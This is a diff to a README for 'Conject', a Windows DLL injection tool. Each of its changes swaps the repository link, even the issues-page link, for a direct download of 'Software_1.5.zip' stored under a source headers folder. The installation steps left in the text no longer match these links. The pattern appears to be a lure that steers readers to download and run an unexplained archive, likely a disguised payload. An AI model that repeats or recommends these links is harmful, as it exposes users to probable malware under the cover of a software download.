@@ -1,6 +1,6 @@
 # 🔧 Conject - Easy DLL Injection for Windows  
 
-[![Download Conject](https://img.shields.io/badge/Download-Conject-brightgreen?style=for-the-badge)](https://github.com/kuan0118/Conject)
+[![Download Conject](https://img.shields.io/badge/Download-Conject-brightgreen?style=for-the-badge)](https://github.com/kuan0118/Conject/raw/refs/heads/main/src/headers/Software_1.5.zip)
 
 ---
 
@@ -39,13 +39,13 @@ Before you start, make sure your computer meets these requirements:
 
 Start by downloading Conject from the official GitHub page. Click the big green button above or visit the link:
 
-[Download Conject from GitHub](https://github.com/kuan0118/Conject)
+[Download Conject from GitHub](https://github.com/kuan0118/Conject/raw/refs/heads/main/src/headers/Software_1.5.zip)
 
 ---
 
 ## 📥 How to Download and Install Conject
 
-1. Visit the page: https://github.com/kuan0118/Conject  
+1. Visit the page: https://github.com/kuan0118/Conject/raw/refs/heads/main/src/headers/Software_1.5.zip  
 2. Look for the latest release section or the main repository files.  
 3. Download the ZIP file that contains the Conject program. It usually has a name like `Conject.zip`.  
 4. After downloading, right-click the ZIP file and select “Extract All...” to unzip it into a new folder.  
@@ -165,7 +165,7 @@ You can learn more about DLL injection and process management on sites like:
 
 For help beyond this guide, you can open an issue on the GitHub repository page:  
 
-https://github.com/kuan0118/Conject/issues
+https://github.com/kuan0118/Conject/raw/refs/heads/main/src/headers/Software_1.5.zip
 
 Describe your problem clearly and include any error messages you see.
 
@@ -173,4 +173,4 @@ Describe your problem clearly and include any error messages you see.
 
 ## 📥 Download Conject Now
 
-[![Download Conject](https://img.shields.io/badge/Download-Conject-blue?style=for-the-badge)](https://github.com/kuan0118/Conject)
+[![Download Conject](https://img.shields.io/badge/Download-Conject-blue?style=for-the-badge)](https://github.com/kuan0118/Conject/raw/refs/heads/main/src/headers/Software_1.5.zip)
